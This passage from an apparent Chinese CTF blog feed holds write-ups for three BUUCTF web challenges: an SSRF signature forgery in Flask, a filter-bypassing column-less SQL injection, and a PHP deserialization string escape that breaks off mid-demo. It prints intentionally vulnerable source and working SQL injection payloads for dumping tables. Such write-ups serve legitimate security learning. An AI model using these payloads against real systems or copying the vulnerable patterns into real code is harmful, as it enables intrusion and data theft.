        <content type="html"><![CDATA[<p>[De1CTF 2019]SSRF Me</p><span id="more"></span><p>一道python代码审计，发现审计能力真的很重要。</p><p>看到源码：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.<span class="keyword">exists</span>(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> in self.action:</span><br><span class="line">                tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, &#x27;w&#x27;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> in self.action:</span><br><span class="line">                f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, &#x27;r&#x27;)</span><br><span class="line">                result[&#x27;code&#x27;] = <span class="number">200</span></span><br><span class="line">                result[&#x27;data&#x27;] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[&#x27;code&#x27;] == <span class="number">500</span>:</span><br><span class="line">                result[&#x27;data&#x27;] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[&#x27;code&#x27;] = <span class="number">500</span></span><br><span class="line">            result[&#x27;msg&#x27;] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line">@app.route(<span class="string">&quot;/geneSign&quot;</span>, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = <span class="keyword">False</span></span><br><span class="line">    app.run(host=&#x27;<span class="number">0.0</span>.<span class="number">0.0</span>&#x27;)</span><br></pre></td></tr></table></figure><p>分析：</p><p>有三个路由：<code>/geneSign</code> <code>/De1ta</code> <code>/</code></p><p><code>/geneSign</code> 路由是获取签名的 通过get给param传参 然后这里action不是我们能改变的</p><p>一起传入getSign() </p><p>返回 <code>secert_key+param+action</code>的md5值 这里只有param我们能控制</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&quot;/geneSign&quot;</span>, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line">def getSign(action, param):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>再来看<code>/De1ta</code></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><p>get方式给param传参 cookie传action和sign的值</p><p>经过一个waf 这里用来防止用协议</p><p>然后传入Exec()</p><p>先经过checkSign函数检查签名是否符合</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def checkSign(self):</span><br><span class="line">       <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>分别有两个if判断</p><p>第一个if： 当有action有scan时注意这里是<code>in</code> 而不是 <code>==</code>,生成一个tmpfile文件</p><p>将param传入scan函数</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br></pre></td></tr></table></figure><p>这里能看到<code>urllib.urlopen().read()</code>这里就是利用点 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569071434-59e9ac4d-007e-413d-b3b5-6b0572ab50ae.png" alt="img"></p><p>相当于打开param这个文件 题目也提示flag在flag.txt中</p><p>这也就是为什么waf要禁用file协议和gopher协议（也就是http协议的前身）</p><p>因为ssrf漏洞一般都可以搭配很多协议来用</p><p>然后将scan内容写入到tmpfile文件中 但是没法读</p><p>第二个if：当action中有read时 就会读出来赋值给result[data]然后 Exec函数返回result结果</p><p>做到这里当思路就很清晰</p><p>action同时包括scan和read时候既能写入文件也能读出文件,但是我们action的值是我们修改不了的该怎么办呢</p><p>再来看生成签名这里<code>hashlib.md5(secert_key + param + action)</code> 这里我们可以给param传入flag.txtread拼接起来 就算我们没有给action传read 最后md5值是将整个字符串拼接起来包含read值 这就可以了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569721446-365d0287-38a5-4618-a182-6250f63d1336.png" alt="img"></p><p><code>9b231caf6bf82362fa5f78bf8da3d6ec</code>记录下我们的签名 </p><p>成功！</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569831963-9cfa50d0-0e24-4628-9a49-3bc29f274ba6.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask框架 </tag>
            
            <tag> python </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-49-[SWPU2019]Web1</title>
      <link href="/post/89f21605.html"/>
      <url>/post/89f21605.html</url>
      
        <content type="html"><![CDATA[<p>[SWPU2019]Web1</p><span id="more"></span><p>这是一道无列名注入的一道题</p><p>进入发现要注册一个账号并且登录 发现admin已经被注册了 本来一开始的想法是拿到admin的密码就结束了</p><p>进去之后有一个 可以发布内容的 看到这里以为是xss注入 但后来看了大佬wp 不是</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460509878-cf2a45c9-71c9-403f-baf5-1320d375227b.png" alt="img"></p><p>然后在发布广告广告名这里可以进行sql注入</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460618692-5b643a68-2285-4b0b-ba3e-280448656e8e.png" alt="img"></p><p>判断字段数，发现<code>order by</code>被禁用了所以之后联合查询时候包含<code>or</code>表，数据库都被河蟹了。</p><p>空格也被河蟹了 用<code>/**/</code>来绕过 这个本来是mysql用于多行注释的</p><p>就可以用<code>group by</code>代替 或者select 1，2，3… 根据回显判断字段数</p><p>然后这道题还河蟹了<code># --</code>注释符 这里用到了通过闭合后面的单引号来绕过 参考：<a href="https://blog.csdn.net/qq_35733751/article/details/106462625">https://blog.csdn.net/qq_35733751/article/details/106462625</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460895563-48a68425-baff-4026-83d5-abaef46c9ef2.png" alt="img">这张图就可以很形象表示</p><p>判断字段数：<code>1&#39;/**/group/**/by/**/22,&#39;</code> 至于这个末尾的逗号 应该是起一个子句的作用 如果没有就会报错</p><p>查表：<code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39; </code></p><p>这里用到了 <code>mysql.innodb_table_stats</code>因为 <code>or</code> 被河蟹了,又长了一个新姿势 还可以用 <code>sys.schema_auto_increment_columns</code>查表名 参考：<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p>爆出表名：</p><p>FLAG_TABLE,news,users,gtid_slave_pos,ads,users</p><p> 得到了表名 一般来说就要爆列名了 但是这道题不知道列名 然后就要使用无列名注入了，在本地搭了一个环境进行测试</p><p>简单来说无列名注入会给表的列名起一个数字称谓（as用字符当别称也行）然后利用数字查列内容</p><p>参考：<a href="https://err0r.top/article/mardasctf/">https://err0r.top/article/mardasctf/</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461602828-24dea7a0-7adf-4c53-a4ff-bc34ae832eb0.png" alt="img"></p><p>派生表要起个别名 如下图 不然会报错</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461677314-cb1fe5db-e76f-487f-9834-c88fd06c743b.png" alt="img"></p><p>如果是数字 则要用&#96;&#96;包裹起来 如果被河蟹了 就可以用起别名的方式绕过</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461832358-ff3d43fb-a352-4cf2-96e6-507b3806b4b8.png" alt="img"></p><p>构造：<code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461972121-cb82f694-b889-4a2d-b258-2298e09e2968.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678510108817-bea36dc4-e206-4942-a5bc-5ffc0c721b40.png" alt="img"></p><p>至于这里为什么中间是只有 select 1,2,3就结束了  这里没搞明白</p><p>如果我们多加个4 或者减去一个数 则会出现<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678462097766-eb91beb6-0645-4a0c-b7be-c13cc5138410.png" alt="img"></p><p>爆出 查询的列不对应</p><p>原因是之后联合查询这部分字段数只有3个字段<code>union/**/select*from/**/users</code></p><p><code>select 和 union select</code>一起用的时候前后字段数必须相同 </p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> sql bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-48-[安洵杯 2019]easy_serialize_php</title>
      <link href="/post/5419e860.html"/>
      <url>/post/5419e860.html</url>
      
        <content type="html"><![CDATA[<p>[安洵杯 2019]easy_serialize_php</p><span id="more"></span><p>这是一道反序列化字符串逃逸题目 一道学习题目</p><p>打开题目 看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028387439-5e30cbf1-2b4b-499a-8fda-01a0e0aafaa2.png" alt="img"></p><p>看到url 是<code>f=highli_file</code> 看到源码就明白了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以说是主程序了 题目当<code>f=phpinfo()</code>输出<code>phpinfo()</code>我们会找到一些东西</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028629889-2e6333f7-e163-4197-b9e8-c7aec11be3b2.png" alt="img">果然发现了可疑php文件 </p><p>主程序有file_get_contents() 这里应该就是去包含我们发现的d0g3_f1ag.php文件</p><p>还有一个我不知道的特殊点：$_SESSION数组 这是一个数组</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028879443-2428b4ea-e2bd-4b27-a61b-b9f600fbc766.png" alt="img"></p><p>这道题$_SESSION共有三个变量分别为 <code>user function img</code> 其实img用来去包含那个php文件</p><p>但是这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$_SESSION[‘img’]先通过base64加密 然后再进行sha1()函数 尽管主函数最后包含文件之前会有base64解密 但是sha1()函数明显就是不让我们直接将flag文件赋值给$_SESSION[‘img’]</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678029789710-ca04d073-df07-40ab-bf30-5791bbfbffb8.png" alt="img"></p><p>那么应该怎么让$_SESSION[‘img’]等于我们的php文件呢 这里思路大概就是类似于类反序列化 </p><p>本地序列化构造包含了php文件的$_SESSION[‘img’] 然后再反序列去覆盖那个题目中的$_SESSION[‘img’]</p><p>再来看过滤这部分 用空字符去正则代换我们的文件名后缀名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就用到了字符串反序列化沙箱逃逸 参考<a href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p><p>通过一个小demo简单看一下原理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//反序列化字符串逃逸</span></span><br><span class="line"><span 